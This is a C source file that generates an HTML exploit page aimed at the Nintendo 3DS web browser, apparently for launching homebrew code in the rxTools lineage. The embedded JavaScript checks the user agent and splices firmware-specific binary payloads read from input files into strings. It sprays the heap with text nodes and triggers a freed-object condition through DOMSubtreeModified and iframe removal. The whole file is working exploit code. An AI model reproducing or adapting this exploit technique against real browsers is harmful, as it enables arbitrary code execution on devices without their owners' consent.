/*
 * Copyright (C) 2015 173210 <root.3.173210@live.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 * HTML code is based on rxTools by roxas75.
 */

#include <errno.h>
#include <stdio.h>
#if __STDC_VERSION__ == 201112L
#include <uchar.h>
#else
#include <stdint.h>

typedef uint_least16_t char16_t;
#endif

#define FIRM_VER_SIZE 6

static const char firms[][FIRM_VER_SIZE] = {
	"17412", "17455", "17498", "17552", "17567"
};

int main(int argc, const char *argv[])
{
	FILE *fp;
	char16_t c;
	const char **path;
	unsigned i;

	if (argc != 6) {
		printf("Usage: %s", argv[0]);

		for (i = 0; i < sizeof(firms) / FIRM_VER_SIZE; i++)
			printf(" <%s>", firms[i]);

		putchar('\n');

		return EINVAL;
	}

	printf("<html>"
			"<head>"
				"<script>"
					"d=document,r=parent,w=window;"
					"if(r==w){"
						"u=decodeURI(d.URL),g=u.split('?');"
						"if(g.length>1){"
							"g=g[1].split('&');"
							"if(g[0].length>0&&g[0].length<25)"
								"l=g[0];"
							"if(g.length>1&&g[1].length>0)"
								"d.head.childNodes[0].href=g[1];"
							"d.title='Load '+l;"
							"w.onload=function(){"
								"d.body.childNodes[0].innerHTML=l+' loading<iframe height=0 src=#/>';"
							"}"
						"}else{"
							"w.onload=function(){"
								"d.body.childNodes[0].innerHTML='Usage: '+u+'?PATH';"
							"}"
						"}"
					"}else{"
						"w.onload=function(){"
							"b=0,f=w.frameElement,p=f.parentNode,o=d.createElement('object');"
							"o.addEventListener('beforeload',function(){"
								"if(++b==1)"
									"p.addEventListener('DOMSubtreeModified',r.z);"
								"else if(b==2)"
									"p.removeChild(f);"
							"});"
							"d.body.appendChild(o);"
						"}"
					"}"
					"function z(){"
						"n=navigator.userAgent;"
						"if(n.indexOf('Nintendo 3DS')!=-1){"
							"m=[],q={");

	path = argv;
	for (i = 0; i < sizeof(firms) / FIRM_VER_SIZE; i++) {
		path++;
		fp = fopen(*path, "rb");
		if (fp == NULL) {
			perror(*path);
			return -1;
		}

		if (i)
			putchar(',');

		printf("'%s':'", firms[i]);

		while (fread(&c, sizeof(c), 1, fp) > 0) {
			if (c == 0)
				printf("\\0");
			else if (c == '\'')
				printf("\\'");
			else if (c < 0x80)
				putchar((char)c);
			else if (c < 0x800) {
				putchar((char)(c >> 6) | 0xC0);
				putchar(((char)c & 0x3F) | 0x80);
			} else {
				putchar(((char)(c >> 12) & 0x0F) | 0xE0);
				putchar(((char)(c >> 6) & 0x3F) | 0x80);
				putchar(((char)c & 0x3F) | 0x80);
			}
		}

		putchar('\'');

		fclose(fp);
	}

	printf(						"}[n.substring(n.lastIndexOf('/')+1,n.lastIndexOf('.'))].replace(':','dmc:/'+l+Array(26-l.length).join('\\0'))+Array(74).join('\\0'),"
							"s=q.length-1;"
							"for(j=1;j<410;j++){"
								"i=4*j/s,a=Array(j);"
								"for(k=0;k<i;a[k++]=q);"
								"m.push(d.createTextNode(String.fromCharCode.apply(null,Array(a))));"
							"}"
						"}"
					"}"
				"</script>"
			"</head>"
			"<body>"
				"<h1>.</h1>"
			"</body>"
		"</html>");

	return 0;
}
